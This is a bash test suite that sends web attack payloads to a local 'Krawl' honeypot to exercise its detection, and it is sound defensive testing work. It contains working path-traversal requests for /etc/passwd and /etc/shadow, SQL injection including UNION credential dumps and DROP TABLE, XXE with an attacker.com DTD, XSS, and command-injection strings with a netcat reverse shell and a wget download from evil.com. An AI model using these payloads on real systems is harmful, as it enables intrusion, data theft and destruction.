#!/bin/bash

# Test script for all attack types in Krawl honeypot
# Tests: Path Traversal, XXE, Command Injection, SQL Injection, XSS

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Server configuration
SERVER_URL="${SERVER_URL:-http://localhost:1234}"
SLEEP_TIME="${SLEEP_TIME:-0.5}"

echo -e "${BLUE}======================================${NC}"
echo -e "${BLUE}  Krawl Honeypot Attack Test Suite${NC}"
echo -e "${BLUE}======================================${NC}"
echo ""
echo -e "${YELLOW}Testing server: ${SERVER_URL}${NC}"
echo ""

# Function to print test header
test_header() {
    echo ""
    echo -e "${GREEN}[TEST]${NC} $1"
    echo "----------------------------------------"
}

# Function to print request info
request_info() {
    echo -e "${YELLOW}Request:${NC} $1"
}

# Function to print response
response_info() {
    echo -e "${BLUE}Response (first 200 chars):${NC}"
    echo "$1" | head -c 200
    echo ""
    echo ""
}

#############################################
# PATH TRAVERSAL ATTACKS
#############################################

test_header "Path Traversal - /etc/passwd"
request_info "GET /../../../../etc/passwd"
RESPONSE=$(curl -s "${SERVER_URL}/../../../../etc/passwd")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Path Traversal - /etc/shadow"
request_info "GET /../../../etc/shadow"
RESPONSE=$(curl -s "${SERVER_URL}/../../../etc/shadow")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Path Traversal - Windows path"
request_info "GET /..\\..\\..\\windows\\system32\\config\\sam"
RESPONSE=$(curl -s "${SERVER_URL}/..\\..\\..\\windows\\system32\\config\\sam")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Path Traversal - URL encoded"
request_info "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
RESPONSE=$(curl -s "${SERVER_URL}/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Path Traversal - /proc/self/environ"
request_info "GET /../../../../proc/self/environ"
RESPONSE=$(curl -s "${SERVER_URL}/../../../../proc/self/environ")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Path Traversal - config file"
request_info "GET /../../config.php"
RESPONSE=$(curl -s "${SERVER_URL}/../../config.php")
response_info "$RESPONSE"
sleep $SLEEP_TIME

#############################################
# COMMAND INJECTION ATTACKS
#############################################

test_header "Command Injection - cmd parameter with id"
request_info "GET /test?cmd=id"
RESPONSE=$(curl -s "${SERVER_URL}/test?cmd=id")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Command Injection - exec parameter with whoami"
request_info "GET /api/search?exec=whoami"
RESPONSE=$(curl -s "${SERVER_URL}/api/search?exec=whoami")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Command Injection - command parameter with ls"
request_info "GET /admin?command=ls -la"
RESPONSE=$(curl -s "${SERVER_URL}/admin?command=ls%20-la")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Command Injection - pipe with whoami"
request_info "GET /search?q=test|whoami"
RESPONSE=$(curl -s "${SERVER_URL}/search?q=test|whoami")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Command Injection - semicolon with id"
request_info "GET /page?id=1;id"
RESPONSE=$(curl -s "${SERVER_URL}/page?id=1;id")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Command Injection - double ampersand with cat"
request_info "GET /view?file=data.txt&&cat /etc/passwd"
RESPONSE=$(curl -s "${SERVER_URL}/view?file=data.txt&&cat%20/etc/passwd")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Command Injection - command substitution"
request_info "GET /test?\$(whoami)"
RESPONSE=$(curl -s "${SERVER_URL}/test?\$(whoami)")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Command Injection - backticks"
request_info "GET /test?\`id\`"
RESPONSE=$(curl -s "${SERVER_URL}/test?\`id\`")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Command Injection - /bin/bash"
request_info "GET /shell?cmd=/bin/bash -c 'id'"
RESPONSE=$(curl -s "${SERVER_URL}/shell?cmd=/bin/bash%20-c%20'id'")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Command Injection - netcat"
request_info "GET /test?cmd=nc -e /bin/sh 192.168.1.1 4444"
RESPONSE=$(curl -s "${SERVER_URL}/test?cmd=nc%20-e%20/bin/sh%20192.168.1.1%204444")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Command Injection - wget"
request_info "GET /test?cmd=wget http://evil.com/malware.sh"
RESPONSE=$(curl -s "${SERVER_URL}/test?cmd=wget%20http://evil.com/malware.sh")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Command Injection - uname -a"
request_info "GET /info?cmd=uname -a"
RESPONSE=$(curl -s "${SERVER_URL}/info?cmd=uname%20-a")
response_info "$RESPONSE"
sleep $SLEEP_TIME

#############################################
# SQL INJECTION ATTACKS
#############################################

test_header "SQL Injection - single quote"
request_info "GET /user?id=1'"
RESPONSE=$(curl -s "${SERVER_URL}/user?id=1'")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "SQL Injection - OR 1=1"
request_info "GET /login?user=admin' OR '1'='1"
RESPONSE=$(curl -s "${SERVER_URL}/login?user=admin'%20OR%20'1'='1")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "SQL Injection - UNION SELECT"
request_info "GET /product?id=1 UNION SELECT username,password FROM users"
RESPONSE=$(curl -s "${SERVER_URL}/product?id=1%20UNION%20SELECT%20username,password%20FROM%20users")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "SQL Injection - SQL comment"
request_info "GET /search?q=test'--"
RESPONSE=$(curl -s "${SERVER_URL}/search?q=test'--")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "SQL Injection - time-based blind"
request_info "GET /user?id=1' AND SLEEP(5)--"
RESPONSE=$(curl -s "${SERVER_URL}/user?id=1'%20AND%20SLEEP(5)--")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "SQL Injection - information_schema"
request_info "GET /search?q=1' UNION SELECT table_name FROM information_schema.tables--"
RESPONSE=$(curl -s "${SERVER_URL}/search?q=1'%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "SQL Injection - stacked queries"
request_info "GET /user?id=1; DROP TABLE users--"
RESPONSE=$(curl -s "${SERVER_URL}/user?id=1;%20DROP%20TABLE%20users--")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "SQL Injection - POST request"
request_info "POST /login with username=admin' OR '1'='1"
RESPONSE=$(curl -s -X POST "${SERVER_URL}/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin' OR '1'='1&password=anything")
response_info "$RESPONSE"
sleep $SLEEP_TIME

#############################################
# XXE INJECTION ATTACKS
#############################################

test_header "XXE Injection - file:///etc/passwd"
request_info "POST /api/xml with XXE payload"
XXE_PAYLOAD='<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>'
RESPONSE=$(curl -s -X POST "${SERVER_URL}/api/xml" \
    -H "Content-Type: application/xml" \
    -d "$XXE_PAYLOAD")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "XXE Injection - external entity"
request_info "POST /api/process with external entity"
XXE_PAYLOAD='<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY bar SYSTEM "file:///etc/shadow">
]>
<foo>&bar;</foo>'
RESPONSE=$(curl -s -X POST "${SERVER_URL}/api/process" \
    -H "Content-Type: application/xml" \
    -d "$XXE_PAYLOAD")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "XXE Injection - parameter entity"
request_info "POST /api/data with parameter entity"
XXE_PAYLOAD='<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
]>
<data>&send;</data>'
RESPONSE=$(curl -s -X POST "${SERVER_URL}/api/data" \
    -H "Content-Type: application/xml" \
    -d "$XXE_PAYLOAD")
response_info "$RESPONSE"
sleep $SLEEP_TIME

#############################################
# XSS ATTACKS
#############################################

test_header "XSS - script tag"
request_info "POST /api/contact with <script>alert('XSS')</script>"
RESPONSE=$(curl -s -X POST "${SERVER_URL}/api/contact" \
    -H "Content-Type: application/json" \
    -d '{"name":"Test","email":"test@test.com","message":"<script>alert(\"XSS\")</script>"}')
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "XSS - img onerror"
request_info "POST /api/contact with <img src=x onerror=alert('XSS')>"
RESPONSE=$(curl -s -X POST "${SERVER_URL}/api/contact" \
    -H "Content-Type: application/json" \
    -d '{"name":"<img src=x onerror=alert(1)>","email":"test@test.com","message":"Test"}')
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "XSS - javascript protocol"
request_info "GET /search?q=javascript:alert('XSS')"
RESPONSE=$(curl -s "${SERVER_URL}/search?q=javascript:alert('XSS')")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "XSS - svg onload"
request_info "POST /api/comment with <svg onload=alert(1)>"
RESPONSE=$(curl -s -X POST "${SERVER_URL}/api/comment" \
    -H "Content-Type: application/json" \
    -d '{"comment":"<svg onload=alert(1)>"}')
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "XSS - iframe"
request_info "POST /api/contact with <iframe src=javascript:alert('XSS')>"
RESPONSE=$(curl -s -X POST "${SERVER_URL}/api/contact" \
    -H "Content-Type: application/json" \
    -d '{"name":"Test","email":"test@test.com","message":"<iframe src=javascript:alert(1)>"}')
response_info "$RESPONSE"
sleep $SLEEP_TIME

#############################################
# COMBINED ATTACKS
#############################################

test_header "Combined - Command Injection via SQL parameter"
request_info "GET /user?id=1;id"
RESPONSE=$(curl -s "${SERVER_URL}/user?id=1;id")
response_info "$RESPONSE"
sleep $SLEEP_TIME

test_header "Combined - Path Traversal + Command Injection"
request_info "GET /../../../etc/passwd?cmd=cat"
RESPONSE=$(curl -s "${SERVER_URL}/../../../etc/passwd?cmd=cat")
response_info "$RESPONSE"
sleep $SLEEP_TIME

#############################################
# SUMMARY
#############################################

echo ""
echo -e "${BLUE}======================================${NC}"
echo -e "${BLUE}  Test Suite Completed${NC}"
echo -e "${BLUE}======================================${NC}"
echo ""
echo -e "${GREEN}All attack types have been tested.${NC}"
echo -e "${YELLOW}Check the server logs for detection confirmations.${NC}"
echo -e "${YELLOW}Check the dashboard at ${SERVER_URL}/test/dashboard for statistics.${NC}"
echo ""
echo -e "${BLUE}To view the dashboard in browser:${NC}"
echo -e "  open ${SERVER_URL}/test/dashboard"
echo ""
echo -e "${BLUE}To check attack types via API:${NC}"
echo -e "  curl ${SERVER_URL}/test/api/attack-types"
echo ""
